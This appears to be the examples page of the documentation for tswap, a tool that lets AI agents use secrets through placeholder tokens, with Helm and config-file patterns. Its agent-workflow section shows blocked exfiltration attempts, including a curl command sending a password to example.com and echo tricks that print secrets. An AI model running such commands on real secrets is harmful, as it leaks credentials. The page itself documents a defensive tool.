# Examples

This page is for anyone who wants to see tswap in use. It shows an AI agent's workflow, a backup
script, keeping secrets out of config files, and three ways to deploy with Helm. Every command's
full usage is in [commands.md](commands.md).

## An AI agent workflow

An AI agent like Claude Code can manage and use secrets without seeing them:

```bash
# Agent creates a database password (never sees the value)
tswap create db-password 48

# Agent checks what secrets are available
tswap names
# db-password
# storj-pass

# Agent uses the secret in a command
tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

```bash
# Agent imports a secret from Kubernetes (never sees the value)
kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass

# If the agent accidentally sees a plaintext value, it marks it burned
tswap burn k8s-db-pass "value appeared in command output"

# Check what needs rotation
tswap burned
```

What to do after a burn: [rotating-and-burning.md](rotating-and-burning.md).

Some exfiltration attempts are blocked (the blocklist is shallow, see below):

```bash
tswap run echo {{db-password}}
# Error: 'echo' would expose secret values. ...

tswap run sh -c 'echo {{db-password}} | rev'
# Error: 'sh -c' runs inline code, which can transform and print secrets past redaction.
#        Put the commands in a script file and run that instead, e.g. 'run ./script.sh {{secret}}' ...

tswap run curl 'http://example.com/?key={{db-password}}' '|' cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

tswap checks the command it is given. A pipe or redirect your own shell handles (an unquoted `|` or
`>`) never reaches tswap: the shell applies it to tswap's output.

What the blocklist covers, and what it doesn't: [security-model.md](security-model.md#threat-model-and-non-goals).

## A backup script

```bash
#!/bin/bash
# This script holds no secret value (only the secret's name): it is safe to commit, share,
# or show to AI agents

tswap run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. While `rclone` runs, its command line
and memory hold the value: see
[What tswap does not protect against](security-model.md#what-tswap-does-not-protect-against).

## Keeping secrets out of config files

In Helm `values.yaml` and similar config files, replace plaintext secrets with empty values and a
tswap comment naming the secret to use:

```yaml
database:
  host: db.example.com
  username: app
  password: ""  # tswap: db-password
redis:
  auth: ""  # tswap: redis-auth
```

An AI agent can read this file without seeing secret values.

- `check` verifies that every marker names a known secret.
- `tocomment` annotates a file that already has inline secret values.
- `apply` substitutes the secrets for deployment.

```bash
# Verify all # tswap: markers in a file reference secrets that exist
tswap check values.yaml

# Automatically replace inline secret values with # tswap: markers
tswap tocomment values.yaml --dry-run   # preview changes
tswap tocomment values.yaml             # apply
```

`tswap apply values.yaml` substitutes the values for deployment. Its output holds plaintext: send it
straight to the tool that needs it, as in the Helm patterns below (Option 1), and write it to a file
only as in Option 3.

### Helm deployment patterns

For Helm deployments, there are three approaches.

**Option 1: Process substitution (recommended).** tswap writes no temporary file: the values reach
`helm` over a pipe. What Helm then does with the values it is given is up to Helm:

```bash
# Directly pipe applied secrets to helm via process substitution
helm upgrade myapp ./chart -f <(tswap apply values.yaml)

# With multiple values files
helm upgrade myapp ./chart \
  -f values.yaml \
  -f <(tswap apply secrets.yaml)
```

**Note:** the `# tswap: <secret-name>` comments remain in the applied output, so secret *names*
appear in:

- Helm's `--debug` output;
- release manifests stored in Kubernetes secrets;
- audit logs and observability tools.

This exposes which secrets your application uses (for example `db-password`, `api-key`). If secret names are sensitive in your threat model, use generic names (for example
`secret-1`, `secret-2`) or strip the comments with `sed`:

```bash
helm upgrade myapp ./chart -f <(tswap apply values.yaml | sed 's/#.*tswap.*$//')
```

**Option 2: Individual secret substitution.** Use `{{token}}` syntax with `run`:

```bash
tswap run helm upgrade myapp ./chart \
  --set database.password={{db-password}} \
  --set redis.auth={{redis-auth}}
```

The values are on `helm`'s command line while it runs: see
[What tswap does not protect against](security-model.md#what-tswap-does-not-protect-against).

**Option 3: Temporary file.** When process substitution isn't available. The file holds every value
in plaintext, so make it readable by you only and delete it straight after. This is an operator's
pattern: an agent sends `apply` output to stdout or process substitution only
([agent-integration.md](agent-integration.md#agent-role-no-sudo)).

```bash
f=$(mktemp)                     # a new file only you can read
tswap apply values.yaml > "$f"
helm upgrade myapp ./chart -f "$f"
rm "$f"
```
